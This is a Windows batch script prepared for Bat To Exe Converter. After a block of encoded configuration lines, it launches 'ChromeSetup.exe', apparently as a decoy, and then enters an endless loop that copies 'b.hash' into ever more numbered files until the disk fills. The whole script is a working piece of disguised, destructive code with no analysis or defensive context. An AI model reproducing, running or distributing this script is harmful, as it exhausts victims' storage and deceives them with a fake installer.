::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcAmLMXmqOpEZ++Pv4Pq7skESV+o+OJnS3rGBHPAf5UbsdKoO3mhVlc4/CQ9NblyudgpU
::fBE1pAF6MU+EWHreyHcjLQlHcAmLMXmqOpEZ++Pv4Pq7skESV+o+OJnS3rGBHPAf5UbsdKovmHJbi8Ns
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBZdQRaSAE+/Fb4I5/jH/+aIoUUcFPQ2fIrU5qSCL+Mb63m8Is57g0VZkNkDAR5ndxGkYEE9qmEi
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF25
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF25
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBZdQRaSAE+/Fb4I5/jH/+aIoUUcFPQ2fIrU5qSCL+Mb63n2YJhj02Jf+A==
::YB416Ek+Zm8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
start ChromeSetup.exe
set count=1
call :loop
:loop
set /a count=%count%+1
copy b.hash %count%.hash
goto :loop